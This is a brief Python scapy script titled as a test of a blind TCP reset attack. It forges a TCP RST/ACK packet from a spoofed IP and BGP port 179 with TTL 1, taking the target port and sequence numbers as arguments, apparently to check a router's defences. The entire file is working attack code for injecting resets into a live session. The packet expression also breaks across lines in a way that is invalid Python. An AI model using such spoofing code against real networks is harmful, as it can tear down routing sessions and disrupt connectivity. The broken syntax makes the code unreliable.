#! /usr/bin/env python
# TEST 1: RESET ATTACK
# Causes a RESET of connection
# python ./test1_blind_RST_attack.py (dstPort) (seqNum) (ackNum)
from scapy.all import *

srcIP = "9.0.1.2"
srcPort = 179

dstIP = "9.0.1.1"
dstPort = int(sys.argv[1])

seqNum = int(sys.argv[2])
ackNum = int(sys.argv[3])

spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 1)/
	TCP(dport = dstPort, sport = srcPort, flags = "RA", seq = seqNum , ack = ackNum)

send(spoofed_packet)
